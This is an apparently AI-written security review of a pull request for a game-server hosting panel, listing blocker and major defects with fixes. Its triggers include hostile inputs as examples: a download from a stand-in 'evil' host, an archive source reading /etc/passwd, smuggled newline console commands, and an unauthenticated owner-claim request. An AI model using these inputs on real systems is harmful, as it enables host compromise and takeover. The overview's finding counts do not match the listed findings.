# AI Review — PR #11: Full panel: servers, runtime, console, access, backups, schedules, web UI

**Verdict: REQUEST CHANGES** — multiple BLOCKER security defects (unverified downloads, unconfined extract src, .env never loaded under documented start command, console input without sanitization, permission revocation not closing sockets); the PR claim of "107/107 tests passing" hides silently-skipped backup suites and order-coupled state tests.
**Risk:** high   **Tests:** partial (skipped + order-coupled)   **Reviewed:** 82 files, 21 commits, head `5a25b44`
**Branch:** `feat/full-panel` → `dev`   **Author:** @chirag-gamer

---

## What this PR does

Implements the working Renom panel end-to-end on top of PR #10's installer/setup slice: servers CRUD with quotas and allocations; a local process engine (argv-only, no shell) with start/stop/restart/kill, Socket.IO console, and bounded history; scoped API keys (`jtgsk.*`), subusers, allocation management; tar backups with checksum-verified restore; cron schedules with atomic claiming; the entire web UI (setup, login, servers, console, files, backups, schedules, admin); and a hardened installer with `--check` and one-shot admin creation. The diff matches the stated intent in CHANGELOG.md. Eight foundational docs were also added (tunnels, features/*, servers/*). Test count claim: 107/107.

## Files walkthrough (82 files, +8129 / −316)

| Domain | Files | Notes |
|---|---|---|
| Auth & API security | `middleware/authn.ts`, `middleware/authz.ts`, `routes/api-keys.ts`, `routes/subusers.ts`, `routes/setup.ts`, `routes/users.ts`, `modules/auth/api-keys.ts`, `modules/auth/service.ts` | 8 new/changed files |
| Server lifecycle & runtime | `routes/servers.ts`, `routes/power.ts`, `modules/runtime/engine.ts`, `modules/runtime/install.ts`, `modules/servers/repo.ts`, `cli/realboot*.ts` (×3) | 8 files |
| Jobs / files / tunnels | `routes/backups.ts`, `routes/schedules.ts`, `routes/files.ts`, `routes/tunnel.ts`, `routes/addons.ts`, `modules/backups/service.ts` | 6 files |
| Blueprints & contracts | `routes/blueprints.ts`, `modules/blueprints/{registry,builtin-catalog,schema}.ts`, `packages/contracts/src/index.ts`, `infra/db/migrations/0002-maturity.ts` | 6 files |
| Frontend & console gateway | `http/console-gateway.ts`, `public/app.js`, `public/index.html`, `public/styles.css` | 4 files |
| Installer / wiring / infra | `install.sh`, `renom.sh`, `index.ts`, `config/env.ts`, `infra/db/index.ts`, `shared/errors.ts` | 6 files |
| Tests (integration) | `test/integration/{access,auth,files-authz,gateway,jobs,minecraft,power,servers,setup}.spec.ts` | 9 files |
| Tests (unit) | `test/unit/{blueprints,db,runtime}.spec.ts` | 3 files |
| Config | `.env.example`, `.gitattributes`, `.gitignore`, `apps/panel/package.json`, `package.json` | 5 files |
| Docs (in-repo) | `CHANGELOG.md`, `README.md`, `docs/LEDGER.md`, `docs/PROVENANCE.md`, `docs/tunnels.md`, `docs/features/*.md` (8), `docs/servers/*.md` (10) | 22 files |

---

## Findings overview

- 🔴 **BLOCKER × 8** — supply-chain / sandbox / fail-closed boot / privilege boundary
- 🟠 **MAJOR × 28** — correctness or security weakness with a reachable trigger
- 🟡 **MINOR × 16** — partial failures, defense-in-depth gaps, contract drift
- ⚪ **NIT × 2**
- ❓ **QUESTION × 5**

Each finding below names: `file:line`, root cause, impact, trigger, **concrete fix**, confidence, and the exact lines that prove it. Numbered for cross-reference.

---

## BLOCKER — must fix before merge

### B1. `download` install op accepts artifacts with **no** checksum — unverified binary install (SEC-014)
- **File:** `apps/panel/src/server/modules/blueprints/schema.ts:28`, exec in `apps/panel/src/server/modules/runtime/install.ts:70-81`, `186-241`
- **Root cause:** `sha256` is `.optional()` in the download op's schema. `downloadFile` only verifies when `want` is truthy (`if (want && digest !== want.toLowerCase())`); with no digest supplied, the check is skipped entirely. Several built-in fetches (`fetch-pocketmine`, `fetch-endstone` pip install, `fetch-purpur` when `resolvePurpur` returns `undefined` md5) pass no digest at all.
- **Impact:** Any imported blueprint can fetch an arbitrary URL into the server dir with zero integrity check. MITM or compromised registry/CDN → RCE as the panel user on first launch. Violates FR-040..049 and the CHANGELOG "checksum-verified" claim.
- **Trigger:** Import/seed a blueprint with `{ "op": "download", "url": "https://evil/x.jar", "dest": "server.jar", "maxMB": 100 }`; installs the tampered file silently.
- **Fix:**
  ```ts
  // schema.ts
  z.object({
    op: z.literal("download"),
    url: z.string().url(),
    sha256: z.string().regex(/^[a-f0-9]{64}$/),  // REQUIRED
    dest: z.string().min(1),
    maxMB: z.number().int().min(1).max(2048),
  }),
  // install.ts downloadFile
  const want = guards.sha512 ?? guards.sha256 ?? guards.sha1 ?? guards.md5;
  if (!want) throw new EngineError(`Refusing unverified download (no checksum): ${url}`);
  ```
- **Confidence:** confirmed
- **Evidence:** `sha256: z.string().regex(/^[a-f0-9]{64}$/).optional(),` and `if (want && digest !== want.toLowerCase()) {`

### B2. `extract` op does not confine `src` — arbitrary host-file read or write (SEC-008)
- **File:** `apps/panel/src/server/modules/runtime/install.ts:107-110`, helper at `:328-355`
- **Root cause:** Every other op wraps paths in `confine(ctx.dir, …)`, but `extract` passes `sub(ctx.vars, op.src)` straight to `extractArchive()` with no confinement. `src` is templated from variables, and user-editable variables are substituted into install op fields throughout.
- **Impact:** A blueprint whose `extract.src` references a user-editable variable (or an imported blueprint with `src:"/home/panel/.env"`) reads that host file into the server dir, where it is then downloadable via the file API. Path-traversal class. Combined with B3, also writes outside the server dir.
- **Trigger:** Import a blueprint with `{ op:"extract", src:"/etc/passwd", dest:".", safe:true }`; reinstall.
- **Fix:**
  ```ts
  case "extract": {
    const srcAbs = confine(ctx.dir, sub(ctx.vars, op.src));
    await extractArchive(srcAbs, ctx.dir, sub(ctx.vars, op.dest), op.strip, op.safe);
    break;
  }
  ```
- **Confidence:** confirmed
- **Evidence:** `await extractArchive(sub(ctx.vars, op.src), ctx.dir, sub(ctx.vars, op.dest), op.strip, op.safe);`

### B3. Zip-slip protection is claimed but not implemented; `safe=true` only checks a boolean
- **File:** `apps/panel/src/server/modules/runtime/install.ts:328-355`
- **Root cause:** The function only does `if (!safe) throw`. It never lists/inspects archive members. `unzip -o`, `7z x`, and `tar -xf` are handed the archive with `-d outDir` and will write `../` members outside `outDir` on some platforms/versions. The schema also allows `safe:false` to validate (see M19).
- **Impact:** A malicious or MITM'd archive (downloads from GitHub releases without checksum, polyglot archives) escapes the server directory and overwrites panel files / drops binaries anywhere the panel user can write → RCE.
- **Trigger:** Archive containing `../../panel.db` or an absolute member served from a compromised upstream.
- **Fix:**
  ```ts
  // Validate members before extraction
  const list = await runCmd(tool, listArgs);  // tar -tzf, unzip -Z1
  for (const m of list.split(/\r?\n/)) {
    const t = resolve(outDir, m);
    if (t !== outDir && !t.startsWith(outDir + sep)) {
      rmSync(tmp, { recursive: true, force: true });
      throw new EngineError(`Archive member escapes destination: ${m}`);
    }
  }
  ```
- **Confidence:** confirmed
- **Evidence:** `if (!safe) throw new EngineError("Refusing archive extraction without safe=true");`

### B4. Installer `.env` is never loaded under the documented start command — fail-closed SEC-001 bypassed
- **File:** `apps/panel/src/server/index.ts:60`, consumed by `install.sh:230`
- **Root cause:** `loadEnvFile()` defaults to `process.cwd()`, but npm runs workspace scripts with `cwd` set to the workspace package dir (`apps/panel`), not the repo root where `install.sh` wrote `.env` (`install.sh:14` `cd "$(dirname "$0")"`). The repo root `.env` is therefore invisible.
- **Impact:** With `NODE_ENV=production` sitting only in the ignored `.env`, `isProduction` is false, **SEC-001 fail-closed is bypassed**, an ephemeral dev secret is used, sessions reset every restart, the "your session secret is kept" promise is false. The chosen `PORT`/`HOST` are ignored, `SETUP_TOKEN` is empty at runtime, and `DATA_DIR` resolves relative to `apps/panel` — so the documented "Back up ./data/panel.db" instruction points at a non-existent path. The installed panel is effectively unconfigured.
- **Trigger:** Any install run through the documented `npm start --workspace @renom/panel`.
- **Fix:**
  ```ts
  if (sourceEnv === process.env) {
    const serverDir = dirname(fileURLToPath(import.meta.url));
    const installRoot = resolve(serverDir, "../../../..");  // -> repo root
    if (existsSync(join(installRoot, ".env"))) loadEnvFile(installRoot);
    else loadEnvFile();
  }
  ```
- **Confidence:** confirmed
- **Evidence:** `if (sourceEnv === process.env) loadEnvFile();`

### B5. Permission revocation mid-session does not close socket rooms or stop the live stream (FR-032)
- **File:** `apps/panel/src/server/http/console-gateway.ts:82-89`; `apps/panel/src/server/http/routes/subusers.ts:111-132`
- **Root cause:** `console:join` resolves permissions once and registers `engine.onLine(serverId, …)` which pushes every future line to that socket. Nothing re-validates the grant, and nothing force-closes the room. `DELETE /servers/:id/users/:userId` only deletes the DB row. `attachConsoleGateway` returns `io` but `index.ts:175` discards it.
- **Impact:** A removed/suspended subuser keeps receiving live console output — chat, IPs, RCON-looking lines, player data — until they voluntarily disconnect. Cross-tenant data exposure after access has been revoked. Violates THREAT-MODEL "socket room closed (FR-032)".
- **Trigger:** Owner grants subuser `websocket.connect`; subuser joins; owner deletes the collaborator. The socket stays subscribed and streaming.
- **Fix:** Add a re-auth sweep and export a room-closer; call it from subuser DELETE and suspension paths (full code in Agent 5 review).
- **Confidence:** confirmed
- **Evidence:** `engine.onLine(serverId, (line) => socket.emit("console:line", line)),`

### B6. Console input is not sanitized — embedded newlines/control chars bypass rate limit
- **File:** `apps/panel/src/server/http/console-gateway.ts:128`; engine write at `engine.ts:257`
- **Root cause:** `command.slice(0, 4096)` only truncates length. `engine.sendInput` writes `` stdin.write(`${line}\n`) `` with no control-character filtering. Validation is only `typeof command === "string" && command.length > 0`.
- **Impact:** One rate-limited message can carry `"stop\nop victim\nwhitelist off\n…"` — unlimited commands per token, defeating the per-socket limit entirely. `\r`, `\x03` (SIGINT), `\x04` (EOF), `\x1b` escape sequences pass straight to the child. Violates FR-011.3 "illegal control characters stripped".
- **Trigger:** Any socket client (not the grayed-out UI input) emits a multi-line command string.
- **Fix:**
  ```ts
  const clean = command.replace(/[\u0000-\u001f\u007f]/g, "").slice(0, 4096);
  if (clean.length === 0) { ack?.({ accepted: false }); return; }
  ack?.({ accepted: engine.sendInput(serverId, clean) });
  ```
- **Confidence:** confirmed
- **Evidence:** `ack?.({ accepted: engine.sendInput(serverId, command.slice(0, 4096)) });`

### B7. TOCTOU race in POST /setup/admin — concurrent requests can create two `owner` accounts
- **File:** `apps/panel/src/server/http/routes/setup.ts:53-74`
- **Root cause:** The "already set up" guard (`users.list({limit:1}).length > 0`) is followed much later by `users.create(...)`. Between them sit `parseBody`, token comparison, username lookup, and a bcrypt hash inside `users.create` — a multi-hundred-ms window with no transaction or unique constraint on "exactly one owner".
- **Impact:** An attacker (or a double-click/retried request) can create a second `owner` row on a fresh install, permanently backdooring the panel. `users.list({limit:1})` returns non-empty and legitimate setup is locked; there is no owner-vs-owner removal path.
- **Trigger:** Fire two `POST /api/v3/setup/admin` concurrently with different usernames on an empty DB.
- **Fix:**
  ```ts
  // users/repo.ts
  createFirstOwner(input: CreateUserInput): { user: UserRow | null; created: boolean } {
    return this.db.transaction(() => {
      const row = this.db.prepare("SELECT COUNT(*) AS c FROM users").get() as { c: number };
      if (row.c > 0) return { user: null, created: false };
      return { user: this.create(input), created: true };
    })();
  }
  ```
- **Confidence:** confirmed
- **Evidence:** `if (users.list({ limit: 1 }).length > 0) { throw new ConflictError("Setup is already complete"); }`

### B8. `enum` variables without `options` bypass validation; malformed `rules.pattern` crashes at runtime
- **File:** `apps/panel/src/server/modules/blueprints/schema.ts:82`; runtime at `servers.ts:439,445`
- **Root cause:** `variableSchema` validates only shape, never semantics. `options` is `.optional()` and no `superRefine` ties `type:"enum"` to options. At runtime `servers.ts:439` guards with `def.type === "enum" && def.options` — so an enum with no options falls through and accepts any string. `servers.ts:445` calls `new RegExp(def.rules.pattern)` unguarded → `SyntaxError` → 500.
- **Impact:** Imported blueprint data defeats variable validation (FR-040/FR-044) or induces 500. Schema is the last line of defense and fails open.
- **Trigger:** Import a blueprint with `{ key:"MODE", type:"enum", default:"x" }` (no options) → any value accepted. Or `rules:{ pattern:"([unclosed" }` → 500 on `PUT /variables`.
- **Fix:** attach `superRefine` to `variableSchema` (see Agent 7 finding for full code); make `def.type === "enum"` check unconditional.
- **Confidence:** confirmed
- **Evidence:** `type: z.enum(["string", "integer", "boolean", "enum"]),` and `if (def.type === "enum" && def.options && !def.options.includes(str))`

---

## MAJOR — should fix before merge

### M1. `memoryMb` chosen at create is never applied to the spawned process (SEC-010)
- **File:** `apps/panel/src/server/modules/runtime/engine.ts:69-74`; create at `routes/servers.ts:110-160`
- **Root cause:** `start()` substitutes `{maxMemory}` from `variablesOf()` which returns blueprint defaults (2048/1024) plus `server_variables` rows. The create route writes `servers.memory_mb` but never seeds `server_variables.maxMemory`.
- **Impact:** A server created with `memoryMb: 8192` still launches `-Xmx2048M` (under-provisioned); one created at 128 MB launches `-Xmx2048M`, exceeding its quota. SEC-010 resource limit at create is not enforced for the actual JVM.
- **Trigger:** Create a Paper server with any `memoryMb ≠ 2048` and start it.
- **Fix:** in `servers.create()` and PATCH handler, seed `server_variables.maxMemory`/`initMemory` from `body.memoryMb`.

### M2. `SETUP_TOKEN` unset ⇒ unauthenticated owner claim, no rate limiting on token path
- **File:** `routes/setup.ts:57-66`; `config/env.ts:57-58`
- **Root cause:** If `opts.setupToken` is empty, the entire token block is skipped (`if (required.length > 0)`), leaving only the racy empty-DB check. When a token IS configured, there is no `RateLimiter` (contrast `service.ts` login limiter). `env.ts` defaults `SETUP_TOKEN` to `""` and production validation only checks `JWT_SECRET`.
- **Impact:** Any network-reachable caller can claim ownership of a fresh panel if the installer did not persist `SETUP_TOKEN` (and B4 ensures it usually won't). With a token, it can be attacked offline-speed online.
- **Trigger:** `POST /api/v3/setup/admin {"username":"attacker","password":"..."}` on a host lacking `SETUP_TOKEN`.
- **Fix:** Fail closed when no token is configured unless the request is loopback/CLI, throttle, and require `SETUP_TOKEN` length ≥16 in production.

### M3. Scope escape: any API key can create/revoke sibling keys regardless of its scopes
- **File:** `routes/api-keys.ts:24-74`
- **Root cause:** `router.use(requireAuth(auth))` is the only guard on key management; no `api-keys.create` / `api-keys.revoke` scope is required. The mint-time check only compares `body.scopes` against `callerScopes` for the new key's scopes — it never restricts who can manage keys.
- **Impact:** A narrow API key (e.g. leaked `server.read` key) inherits the full key-management surface of the account: it can revoke the owner's `*` key, enumerate key metadata, and mint unlimited child keys within its scopes.
- **Trigger:** Authenticate with `Authorization: Bearer jtgsk.<id>.<secret>` where scopes=`["server.read"]`; `DELETE /api/v3/api-keys/<full-key-id>` for the user's `*` key, or `POST /api/v3/api-keys` to mint more.
- **Fix:** Add `api-keys.read/create/revoke` to the vocabulary; require `requireScope("api-keys.create")` etc.

### M4. FR-023 suspended-server read scoping is missing on files, schedules, tunnel, and addons GET routes
- **File:** `routes/files.ts:49,60`; `routes/schedules.ts:77`; `routes/tunnel.ts:51`; `routes/addons.ts:46`
- **Root cause:** `requireServerPermission` only checks `deleted_at`. `assertSuspendedReadable` is invoked only in `backups.ts`.
- **Impact:** Collaborators with read permissions still get list/content/schedules/tunnel/addons data on suspended servers, contradicting the documented 404 behavior. `/files/content` can expose server configuration/secrets.
- **Trigger:** Owner suspends server; collaborator calls `GET /servers/:id/files/content` → 200 instead of 404.
- **Fix:** Import `assertSuspendedReadable` and invoke it in each read handler.

### M5. Password policy weakened for admin-created accounts (min 8) vs owner bootstrap (min 12)
- **File:** `routes/users.ts:14`
- **Root cause:** Two divergent password policies: setup requires `min(12)`, but admin-created accounts accept `min(8)`.
- **Impact:** Real-password guarantee applied to the first account is not applied to the rest.
- **Trigger:** `POST /api/v3/users {"password":"12345678"}` → accepted.
- **Fix:** Centralize `passwordSchema` in `shared/` and reuse.

### M6. Any admin can create, suspend, and delete other admins — no owner-only gate
- **File:** `routes/users.ts`
- **Root cause:** The admin guard is role-level, only the `owner` account is specially protected. Admins can mint additional admins then delete/suspend existing admins.
- **Impact:** Privilege consolidation within the admin tier; defeats any "only owner manages admins" intent (FR-002).
- **Fix:** Add `requireOwner` middleware; gate admin-role create/patch/delete behind it.

### M7. `kill()` reports offline even when the process survives the 5s window — orphan process + port reuse
- **File:** `apps/panel/src/server/modules/runtime/engine.ts` (kill, ≈L300)
- **Root cause:** `await this.waitForExit(serverId, 5000)` returns a boolean that is discarded; `this.finish(serverId, "offline")` runs unconditionally.
- **Impact:** A hung/uninterruptible child is detached from the engine and still bound to its allocation port. The row is marked offline, `DELETE /servers/:id` releases the port, `claimFreePort` hands the same port to the next server → two processes fighting for one socket.
- **Trigger:** Start a server whose process ignores SIGKILL long enough (e.g. blocked in kernel I/O). `POST /power {action:"kill"}`, then create another server → gets the same port.
- **Fix:** Escalate and keep tracking on timeout:
  ```ts
  const exited = await this.waitForExit(serverId, 5000);
  if (!exited) {
    this.servers.setRuntimeState(serverId, "stopping");
    throw new EngineError("Process did not exit after SIGKILL; refusing to mark offline");
  }
  this.finish(serverId, "offline");
  ```

### M8. Per-stream partial-line buffer is unbounded — OOM DoS from no-newline output
- **File:** `apps/panel/src/server/modules/runtime/engine.ts:143-155`
- **Root cause:** `buffers[stream] += String(chunk)` accumulates without cap; `LINE_MAX` is only applied in `emit()` (after a newline is seen). A chunk with no `\n` grows the buffer forever.
- **Impact:** Any server that never emits a newline causes the panel process to exhaust memory and die, taking down every hosted server.
- **Fix:** Cap the accumulator and force-flush at `LINE_MAX`:
  ```ts
  if (buffers[stream].length > LINE_MAX) {
    emit(stream, buffers[stream].slice(0, LINE_MAX) + "…[truncated]");
    buffers[stream] = buffers[stream].slice(-1);
  }
  ```

### M9. EULA is enforced only at create; `engine.start()` and reinstall never check acceptance
- **File:** `engine.ts:56-67`; reinstall route `routes/servers.ts:install`; route-only check at `servers.ts:create`
- **Root cause:** Only `if (doc.features?.includes("eula") && body.eulaAccepted !== true)` exists. `engine.start()` has no reference to `eula_accepted_at`; the `eula-accept` install op writes `eula.txt` with `eula=true` unconditionally. A blueprint that has an `eula-accept` op without `features:["eula"]` bypasses the gate entirely. Mojang EULA/legal exposure (SEC/legal gate, AGENTS hierarchy #1).
- **Fix:** Enforce at the runtime boundary, not just the route:
  ```ts
  if (server.status !== "ready") throw new EngineError(`Server is not ready to start (status: ${server.status})`);
  if ((doc.features?.includes("eula") || doc.install.some(o => o.op === "eula-accept")) && !server.eula_accepted_at) {
    throw new EngineError("Minecraft EULA has not been accepted for this server");
  }
  ```

### M10. Unguarded `mkdirSync` after `servers.create` orphans a stuck `creating` row and leaks the port
- **File:** `routes/servers.ts:120-126`
- **Root cause:** `servers.create()` commits row + allocation. `mkdirSync(serverDir, { recursive: true })` is not wrapped in try/catch. A filesystem/permission error throws to `next(e)` after the DB state is durable.
- **Impact:** Client gets a 500 but the row stays `creating` forever and its port stays claimed. Resource quota counts it; allocation is never released (only `remove()` releases). Repeated failed attempts exhaust quota and port range.
- **Fix:** Create the directory BEFORE persisting, or compensate on failure:
  ```ts
  try { mkdirSync(join(dataDir, "servers", created.id), { recursive: true }); }
  catch (e) { servers.remove(created.id); throw new EngineError(...); }
  ```

### M11. Destructive `DELETE /servers/:id` guarded by `settings.reinstall`, not owner/admin
- **File:** `routes/servers.ts:305`
- **Root cause:** `router.delete("/servers/:id", guard("settings.reinstall"), …)` reuses the reinstall permission for permanent deletion. `requireAdmin` is not applied.
- **Impact:** Any subuser granted `settings.reinstall` (intended to allow re-running install ops) can irreversibly soft-delete the server, kill its process, and release its allocation.
- **Fix:**
  ```ts
  router.delete("/servers/:id", requireAdmin, guard("settings.delete"), ...);
  ```

### M12. No boot-time state reconciliation in the runtime engine (FR-010 / NFR-074)
- **File:** `apps/panel/src/server/modules/runtime/engine.ts`
- **Root cause:** The engine constructor initializes `live = new Map()` only; `shutdown()` sweeps live children, but there is no scan of persisted `servers.runtime_state` on startup to flip stale rows to `offline`. Reconcile-on-boot ≤30s is claimed in API-AND-EVENTS but no reconcile function exists.
- **Impact:** After `kill -9` of the panel while a server runs, the DB keeps `runtime_state='running'` while no child exists. Status is claimed to be "runtime truth"; it now lies.
- **Fix:** Add `reconcile()` called at boot before serving traffic:
  ```ts
  async reconcile(): Promise<void> {
    const rows = this.db.prepare(
      "SELECT id FROM servers WHERE deleted_at IS NULL AND runtime_state IS NOT NULL AND runtime_state <> 'offline'"
    ).all() as Array<{ id: string }>;
    for (const r of rows) this.servers.setRuntimeState(r.id, "offline");
  }
  ```

### M13. PATCH guarded by `settings.rename` mutates RAM/disk allocations
- **File:** `routes/servers.ts:187-207`
- **Root cause:** `patchServerSchema` includes `memoryMb`/`diskQuotaMb`; the handler forwards the whole body to `servers.update()`. There is no `settings.resources` permission check. Quota math is present; permission is not.
- **Impact:** A collaborator trusted only to rename can consume the owner's RAM/disk quota (up to plan ceiling).
- **Fix:** Split handler by field or check `settings.resources` when `body.memoryMb !== undefined || body.diskQuotaMb !== undefined`.

### M14. Background install failures are fire-and-forget — client gets 201 but no failure signal
- **File:** `routes/servers.ts:146-165`
- **Root cause:** `void runInstallOps(...).then().catch()` runs detached; the 201 response is built from `fresh = servers.byId(...)` after `setStatus("installing")`. The catch only flips DB status and writes an audit row.
- **Impact:** The client is never told install failed except by polling `status` — and only if the front end does. UX/contract gap.
- **Fix:** Include terminal status in the create response after a bounded await, or return `{install: {state:"installing"}}` and document polling.

### M15. `claimFreePort` has no retry despite the comment promising the caller retries
- **File:** `apps/panel/src/server/modules/servers/repo.ts:114-140`
- **Root cause:** Docstring says "a concurrent claim aborts our transaction and the caller retries", but `create()` contains no retry loop, and no caller catches the UNIQUE violation.
- **Impact:** Two simultaneous `POST /servers` from the same owner can produce a 500.
- **Fix:** Wrap `create` port claim in a bounded retry:
  ```ts
  for (let attempt = 0; attempt < 5; attempt++) {
    try { return this.db.transaction(() => { /* … */ }).immediate(); }
    catch (e) { if (String(e).includes("UNIQUE")) continue; throw e; }
  }
  throw new Error("no free ports in allocation range");
  ```

### M16. `seedBuiltins` never updates built-in doc content — catalog fixes never reach existing installs
- **File:** `apps/panel/src/server/modules/blueprints/registry.ts:42-46`
- **Root cause:** For an existing slug only `maturity`/`updated_at` are updated; `storeVersion` is called only in the not-exists branch. The comment claims "Converge catalog edits" but `name`, `run.command`, `install` ops, checksums, and `tag` are never reconciled.
- **Impact:** Any fix shipped to `BUILTIN_BLUEPRINTS` (e.g. adding a required checksum) silently does not apply to any node that seeded an earlier version.
- **Fix:** Compare `desired` doc hash against `blueprint_versions.sha256` and re-store when changed.

### M17. Unrestricted outbound fetch from blueprint `download.url` (SSRF) and redirects
- **File:** `apps/panel/src/server/modules/runtime/install.ts:70-81, 186-197`
- **Root cause:** `downloadFile` calls `fetchImpl(url, ...)` with a URL taken directly from the blueprint op and follows redirects by default. No scheme/host allowlist or private-range blocking.
- **Impact:** An imported blueprint can make the panel issue authenticated requests to internal services (cloud metadata `169.254.169.254`, localhost admin ports). Response bodies land in the server directory.
- **Fix:**
  ```ts
  const ALLOWED_HOSTS = new Set(["fill.papermc.io", "piston-meta.mojang.com", "api.modrinth.com", ...]);
  if (!ALLOWED_HOSTS.has(new URL(url).hostname)) throw new EngineError(`Download host not allowed: ${url}`);
  // redirect: "error"
  ```

### M18. `engine.start()` does not enforce `server.status` — can launch mid-install or after `install_failed`
- **File:** `engine.ts:56-67`
- **Root cause:** The only guards are `suspended` and `stateOf !== offline`. A server whose background install is still running (`status === "installing"`) or has failed can be started immediately.
- **Impact:** Spawns against a half-installed directory (missing jar, missing `eula.txt`); state machine is advisory.
- **Fix:** `if (server.status !== "ready") throw new EngineError(...)`.

### M19. `extract.safe` is plain boolean — schema admits `safe:false` despite "must be explicitly true" contract
- **File:** `apps/panel/src/server/modules/blueprints/schema.ts:40`
- **Root cause:** Comment says `must be explicitly true; zip-slip guard required` but the type is `z.boolean()`. Future executors trusting the schema would be zip-slip vulnerable.
- **Fix:** `safe: z.literal(true),`

### M20. Untrusted Modrinth filename used as a filesystem path — path traversal / arbitrary file write
- **File:** `routes/addons.ts:80-84`; install at `install.ts:395-400`
- **Root cause:** Destination is built from `file.filename` from Modrinth API with only a `.jar` regex check; no confinement. `install.ts` has a `confine()` helper but does not use it here. Checksum from the same response, so does not protect.
- **Impact:** Project author (or compromised API) supplies `filename = "../../../../<path>/x.jar"`. `mkdirSync` is called for the escape destination; file is written anywhere the panel user can write. Same-privilege RCE.
- **Fix:**
  ```ts
  const safeName = file.filename.replace(/[\\/]/g, "");
  if (safeName !== file.filename || safeName.includes("..")) throw new EngineError(`Unsafe addon filename '${file.filename}'`);
  await downloadFile(..., confine(ctx.dir, `${platform.dir}/${safeName}`), { sha512: file.hashes.sha512 });
  ```

### M21. Schedule deadlocks permanently after a crash — `is_processing` has no timeout or recovery path
- **File:** `routes/schedules.ts:152`; `modules/schedules/runner.ts:211,214-216,178-179,233-247`
- **Root cause:** Claiming uses a permanent boolean `is_processing`. It is only cleared by `finalize()` in the *same* process. No startup sweep, no reset endpoint.
- **Impact:** After any crash during a long task (e.g. a 10-minute tar backup), the schedule silently never fires again; the documented operator recovery is impossible via the API.
- **Fix:** Add `lock_until` column; honor expiry in `runDue` and `runOnce` claims.

### M22. Locked backups are permanently undeletable (no unlock path) — unbounded disk growth DoS
- **File:** `routes/backups.ts:16-18,68,118-133`; `modules/backups/service.ts:204-226`
- **Root cause:** `locked` settable by any principal with `backup.create`. `remove()` refuses locked records, `enforceRetention()` only purges `locked = 0`. No route ever sets `locked = 0`.
- **Impact:** A user with `backup.create` can create unlimited locked backups, exhausting host disk.
- **Fix:** Add `POST /backups/:id/unlock` (guarded by `backup.delete`) and `backups.unlock(id)`.

### M23. Backups do not exclude secrets by default (`.env`, keys)
- **File:** `modules/backups/service.ts:115`
- **Root cause:** Exclusions come solely from the blueprint doc (`(doc.fileDenylist ?? [])`); every built-in only declares `[".renom/**"]`. No hardcoded default for `.env`, `*.pem`, `*.key`.
- **Impact:** Any secret file a server app/plugin keeps in its directory is archived into every backup and exposed via the download endpoint. Violates SECRETS-AND-KEYS.
- **Fix:** add a hardcoded `DEFAULT_SECRET_EXCLUDES = [".env", "*.pem", "*.key", "id_rsa", ...]` and merge before blueprint denylist.

### M24. `sha256File` reads the entire archive into memory synchronously — OOM/event-loop stall on real backups
- **File:** `modules/backups/service.ts:237-239`
- **Root cause:** `createHash("sha256").update(readFileSync(path))` buffers the whole `.tar.gz`. Game-server snapshots are routinely hundreds of MB to multiple GB.
- **Impact:** Hashing a large backup blocks the Node event loop and can throw `ERR_FS_FILE_TOO_LARGE`/OOM.
- **Fix:** Stream the hash via `pipeline(createReadStream(path), hash)`.

### M25. Rate limit is per-socket and off-spec — trivially multiplied by opening more sockets
- **File:** `apps/panel/src/server/http/console-gateway.ts:99-106`
- **Root cause:** Bucket lives in `socket.data.sendTimes`, so each new connection gets a fresh 30/10s budget. SPEC FR-011.3 requires 20/10s/user/server.
- **Impact:** A malicious subuser opens N sockets and gets 30·N commands per 10s. SEC-006 command-class rate limiting is effectively unenforced.
- **Fix:** Use a module-level bucket keyed by `userId:serverId`.

### M26. Auth token accepted from the handshake query string — "no secret in any URL" violated
- **File:** `apps/panel/src/server/http/console-gateway.ts:39-41`
- **Root cause:** Fallback `?? (socket.handshake.query as { token?: unknown } | undefined)?.token`. SECRETS-AND-KEYS: "No secret in any URL (including query params)". Query strings are logged by reverse proxies and stored in browser history.
- **Impact:** JWT leaked into access log/referrer is a full session credential.
- **Fix:** Drop the query fallback; require `auth.token`.

### M27. No socket backpressure — `console:line` emits are unbounded (FR-011.2)
- **File:** `apps/panel/src/server/http/console-gateway.ts:88`
- **Root cause:** Every engine line is pushed with `socket.emit` directly. No per-socket frame buffer, no drop-oldest policy. Socket.IO will queue packets indefinitely for a slow/stalled client.
- **Impact:** Slow/malicious console subscriber causes unbounded server memory growth.
- **Fix:** Track a bounded pending count; drop when over threshold or use `socket.volatile.emit`.

### M28. Join permission uses `websocket.connect`, not `activity.read`/`control.command` (FR-011.1)
- **File:** `apps/panel/src/server/http/console-gateway.ts:73`
- **Root cause:** SPEC FR-011.1: "join requires `control.command` OR `activity.read`; `control.command` required to send input." Code requires `websocket.connect` to join and `control.console` to send.
- **Impact:** A subuser with `websocket.connect` alone receives full console output; a subuser with `activity.read` alone cannot open the console. Auditors' negative tests won't map.
- **Fix:** Align join with the documented scope union; either update vocabulary or update SPEC.

### M29. Socket event contract not met — wrong names, no `v:1` envelope
- **File:** `apps/panel/src/server/http/console-gateway.ts:85,88,93`
- **Root cause:** API-AND-EVENTS specifies `subscribe`/`command`/`log`/`status` and "All carry `v: 1`". Implementation emits `console:history`/`console:line` with no `v` field.
- **Impact:** Spec-conformant external clients break; versioning mechanism for additive evolution absent.
- **Fix:** Wrap payloads in `{v:1, ...}`; consider updating API-AND-EVENTS to match actual names instead.

### M30. SEC-003 unmet — installer never generates a CSPRNG owner password
- **File:** `install.sh:205-214`
- **Root cause:** SECRETS-AND-KEYS specifies "CSPRNG 16 chars, printed once by installer". Installer prompts the operator to type a password (`ask_secret`, ≥12).
- **Impact:** Direct deviation from a numbered security requirement; operator-chosen passwords are weak/reused.
- **Fix:** Generate via `node -e 'console.log(require("node:crypto").randomBytes(12).toString("base64url").slice(0,16))'` and display once.

### M31. Production boot accepts an empty `SETUP_TOKEN` → open owner claiming
- **File:** `apps/panel/src/server/config/env.ts:57-58`; consumer `routes/setup.ts:57-70`
- **Root cause:** `SETUP_TOKEN` defaults to `""` and production validation only checks `JWT_SECRET`. Combined with B4, the runtime token is empty even when the installer wrote one.
- **Fix:** In production validation: `if (env.SETUP_TOKEN.length < 16) throw new ConfigError(...)`.

### M32. Login rate limiter is bypassable by username flooding — global bucket wipe
- **File:** `apps/panel/src/server/modules/auth/ratelimit.ts:26-29`
- **Root cause:** Key is `login:{ip}:{username}`; each new username yields a new bucket. When `buckets.size >= maxKeys` (10000), code calls `this.buckets.clear()`, wiping every counter including the victim's.
- **Impact:** SEC-006/FR-010 login throttling defeated; unlimited credential stuffing.
- **Fix:** Evict the oldest bucket rather than wiping all.

